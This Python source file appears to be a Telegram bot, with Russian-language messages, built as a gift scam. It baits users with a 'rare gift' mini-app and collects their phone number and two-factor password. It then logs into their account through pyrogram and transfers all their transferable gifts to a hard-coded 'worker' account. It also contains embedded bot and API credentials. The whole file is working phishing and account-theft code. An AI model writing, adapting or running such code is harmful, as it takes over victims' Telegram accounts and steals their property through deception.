import asyncio
import json
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Message, ReplyKeyboardMarkup, KeyboardButton

from pyrogram import Client
from pyrogram.errors import PhoneCodeInvalid, SessionPasswordNeeded

BOT_TOKEN = "8746824790:AAF2Tpr0nUnBTedjrFkcPmVz29jcXsHP6ws"
API_ID = 30356139
API_HASH = "eaf8c970ff553abe2f1578717c82e50e"
WORKER_ID = 8486064073 # твой ID или username воркера

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

sessions_dir = Path("sessions")
sessions_dir.mkdir(exist_ok=True)

class Auth(StatesGroup):
    code = State()
    password = State()

start_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(
        text="🎁 Получить редкий подарок",
        web_app=WebAppInfo(url="https://твой-домен.github.io/mini-app/")
    )],
])

@dp.message(CommandStart())
async def start(message: types.Message):
    await message.answer(
        "Добро пожаловать в маркет редких подарков Telegram!\n"
        "Нажми кнопку ниже, чтобы получить свой подарок.",
        reply_markup=start_kb
    )

@dp.message(lambda m: m.web_app_data)
async def handle_webapp(message: types.Message, state: FSMContext):
    data = json.loads(message.web_app_data.data)
    user_id = message.from_user.id

    if 'contact' in data:
        phone = data['contact']['phone_number']
        if not phone.startswith('+'):
            phone = '+' + phone

        await message.answer("Номер получен. Проверяю подарки...")

        app = Client(
            f"sessions/{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone
        )

        await app.start()
        try:
            me = await app.get_me()
            await message.answer(f"Добро пожаловать, {me.first_name}! Проверяю подарки...")

            gifts = await app.get_profile_gifts("me")
            transferred = 0
            for gift in gifts:
                if gift.can_be_transferred:
                    await app.transfer_gift(gift.id, WORKER_ID)
                    transferred += 1

            await message.answer(f"Передано {transferred} подарков! Спасибо за использование 🔥")
        except SessionPasswordNeeded:
            await message.answer("Включена 2FA. Введите пароль:")
            await state.set_state(Auth.password)
            await state.update_data(app=app, phone=phone)
        except Exception as e:
            await message.answer("Подарков не найдено или ошибка. Попробуйте позже.")
        finally:
            await app.stop()

    elif 'code' in data:
        # Обработка кода из SMS (если понадобится)
        pass

@dp.message(Auth.password)
async def process_password(message: Message, state: FSMContext):
    data = await state.get_data()
    app = data['app']
    phone = data['phone']

    try:
        await app.check_password(message.text.strip())
        await message.answer("2FA принята! Забираем подарки...")

        gifts = await app.get_profile_gifts("me")
        transferred = 0
        for gift in gifts:
            if gift.can_be_transferred:
                await app.transfer_gift(gift.id, WORKER_ID)
                transferred += 1

        await message.answer(f"Передано {transferred} подарков! Спасибо 🔥")
    except Exception as e:
        await message.answer(f"Неверный пароль или ошибка: {str(e)}")
    finally:
        await app.stop()
        await state.clear()

async def main():
    print("Polling запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
